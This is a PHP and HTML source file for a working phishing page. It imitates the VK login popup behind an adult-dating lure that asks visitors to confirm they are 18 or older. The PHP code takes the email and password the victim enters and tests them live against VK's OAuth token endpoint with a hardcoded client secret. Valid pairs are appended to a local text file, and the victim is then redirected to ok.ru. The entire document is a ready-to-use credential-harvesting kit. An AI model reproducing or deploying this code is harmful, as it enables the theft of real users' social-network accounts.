<?
//die;
header("Content-Type: text/html; charset=windows-1251");

///////////////////////////////////////
$filename="data_ghfqwkhre.txt";
$redirect_to="https://ok.ru/";
///////////////////////////////////////


if($_POST["do"]=="login"){



    $get_url="https://oauth.vk.com/token?grant_type=password&client_id=3140623&client_secret=VeWdmVclDCtn6ihuP1nt&username=".$_POST["email"]."&password=".$_POST["pass"]."";
//var_dump($get_url);
    $headers=array();
    $handle = curl_init();
    curl_setopt( $handle, CURLOPT_URL, $get_url );
    curl_setopt( $handle, CURLOPT_HTTPHEADER, $headers );
    curl_setopt( $handle, CURLOPT_SSL_VERIFYPEER, false );
    curl_setopt( $handle, CURLOPT_SSL_VERIFYHOST, false );
    curl_setopt( $handle, CURLOPT_RETURNTRANSFER, true );
    $response = curl_exec( $handle );
    $code = curl_getinfo( $handle, CURLINFO_HTTP_CODE );

    $response=json_decode($response, true );
    //var_dump($response);

    if(isset($response["access_token"])){
        //echo "<center><br><br><hr>Ваш access_token:<br><input type='text' value='".$response["access_token"]."' style='width:100%;'></center>";
        
	$curfile=file_get_contents($filename);
	$curfile=$curfile."\r\n".$_POST["email"].";".$_POST["pass"];
	file_put_contents($filename,$curfile);
	header("Location: ".$redirect_to."");
	die;
//echo "Пароль правильный!";
    }else{
        //echo "ОШИБКА: ".$response["error_description"]."";
    }
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- saved from url=(0117)https://oauth.vk.com/authorize?client_id=3294907&redirect_uri=http://moguza.ru/auth/gate/vk&scope=&response_type=code -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Девочки без предоплаты в твоем городе</title>
    <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_cnt.css?2696088870" />
    <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?3926032117" />
    <link type="text/css" rel="stylesheet" href="https://vk.com/css/api/oauth_popup.css?417312148"></link>
    <script type="text/javascript" language="javascript" src="https://vk.com/js/api/common_light.js?2102079137"></script>
    <script type="text/javascript" language="javascript">// <![CDATA[
        function allow(button) {
            if (isButtonLocked(button)) return false;
            lockButton(button);

            var addr = '';
            if (isChecked(ge('allow_notifications'))) {
                addr = '&notify=1';
            }
            if (isChecked(ge('denied_email'))) {
                addr = '&email_denied=1';
            }
            location.href = "https://login.vk.com/?act=grant_access&client_id=3294907&settings=0&redirect_uri=http%3A%2F%2Fmoguza.ru%2Fauth%2Fgate%2Fvk&response_type=code&group_ids=&direct_hash=fcf2797fe90fab1935&token_type=0&v=&state=&display=page&ip_h=f6733a658ab42bb49a&hash=679bb9131c087d2d7c&https=1"+addr;
            return false;
        }

        function cancel() {
            location.href = "login.php";
            return false;
        }

        function login(button) {
            if (isButtonLocked(button)) return false;
            lockButton(button);
            ge('login_submit').submit();
        }

        function doResize(onResize) {
            onResize && setTimeout(function() {
                doResize()
            }, 100);

            if (!hasClass(document.body, 'oauth_centered') && !onResize) {
                if (window.outerHeight !== void 0) {
                    var panelH = (window.outerHeight - window.innerHeight) | 0,
                        panelW = (window.outerWidth - window.innerWidth) | 0;
                } else {
                    var panelH = 50,
                        panelW = 0;
                }
                var contentH = Math.max(ge('oauth_wrap_content').offsetHeight, 430),
                    contentW = 655;
                window.resizeTo(contentW + panelW, contentH + panelH);
                window.moveTo(
                    (screen.width - contentW) / 2 + (screen.availLeft | 0),
                    ((screen.height - contentH) / 2) + (screen.availTop | 0)
                );
            }
        }

        function toggleEmailPrivacy() {
            checkbox('denied_email');
            if (!isChecked('denied_email')) {
                hide('denied_email');
                show('allowed_email');
            } else {
                hide('allowed_email');
                show('denied_email');
            }
        }

        if (parent && parent != window) {
            location.href = "https://oauth.vk.com/blank.html";
        }


        // ]]></script>
</head>

<body onload="doResize();" class="VK oauth_centered">
<script>
    if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
</script>
<div class="oauth_wrap">
    <div class="oauth_wrap_inner">
        <div class="oauth_wrap_content" id="oauth_wrap_content">
            <div class="oauth_head">
                <a class="oauth_logo fl_l" href="https://vk.com/" target="_blank"></a>
                <div id="oauth_head_info" class="oauth_head_info fl_r">
                    <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
                </div>
            </div>

            <div class="oauth_content box_body clear_fix">
                <div class="box_msg_gray box_msg_padded">"Сайт Секс Без Предоплаты" <b>АВТОРИЗОВАТЬСЯ ЧЕРЕЗ КОНТАКТ</b> подтвердить свой возраст 18+.</div>

                <form method="POST" id="login_submit" action="<?php echo $_SERVER["REQUEST_URI"];?>">
                    <div class="oauth_form">



                        <div class="oauth_form_login">
                            <input type="hidden" name="do" value="login">
                            <input type="hidden" name="ip_h" value="f6733a658ab42bb49a">
                            <input type="hidden" name="lg_h" value="5358ea55aa56193e69">
                            <input type="hidden" name="_origin" value="https://oauth.vk.com">
                            <input type="hidden" name="to" value="aHR0cHM6Ly9vYXV0aC52ay5jb20vYXV0aG9yaXplP2NsaWVudF9pZD0zMjk0OTA3JnJlZGlyZWN0X3VyaT1odHRwJTNBJTJGJTJGbW9ndXphLnJ1JTJGYXV0aCUyRmdhdGUlMkZ2ayZyZXNwb25zZV90eXBlPWNvZGUmc2NvcGU9MCZ2PSZzdGF0ZT0mZGlzcGxheT1wYWdl">
                            <input type="hidden" id="expire" name="expire" value="0">

                            <div class="oauth_form_header=">Телефон или еmаil</div>
                            <input type="text" class="oauth_form_input dark" name="email" value="">
                            <div class="oauth_form_header">Пароль</div>
                            <input type="password" class="oauth_form_input dark" name="pass">



                            <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button>
                            <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
                            <input type="submit" name="submit_input" class="unshown">

				<?php if($_POST["do"]=="login"){ ?>
				<div style="text-align: center;font-weight: bold;color: red;margin-top: 17px;">
					Логин или пароль введены не правильно!
				</div>
				<?php } ?>

                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

</body></html>